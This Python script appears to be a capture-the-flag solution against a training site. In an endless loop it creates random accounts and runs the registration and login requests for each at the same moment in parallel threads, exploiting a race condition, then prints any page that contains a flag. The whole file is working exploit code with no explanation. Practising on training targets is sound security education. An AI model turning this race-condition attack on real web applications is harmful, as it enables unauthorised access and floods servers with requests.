import requests
import random
import string
import threading
import time

base_url = "http://meta.training.jinblack.it"

def register(username, password, s):
    url = "%s/register.php" % base_url
    data = {"username":username, "password_1":password, "password_2":password, "reg_user": ''}
    response = s.post(url, data=data)

def login(username, password, s):
    url = "%s/login.php" % base_url
    data = {"username":username, "password":password, "log_user": ''}
    response = s.post(url, data=data)

def index(s):
    url = "%s/index.php" % base_url
    response = s.get(url)
    if "flag" in response.text:
        print(response.text)

random_username = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
random_password = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))


while True:
    random_username = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
    random_password = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
    
    s = requests.Session()
    
    t1 = threading.Thread(target=register, args=(random_username, random_password, s))
    t2 = threading.Thread(target=login, args=(random_username, random_password, s))
    
    t1.start()
    t2.start()

    t1.join()
    t2.join()
    
    index(s)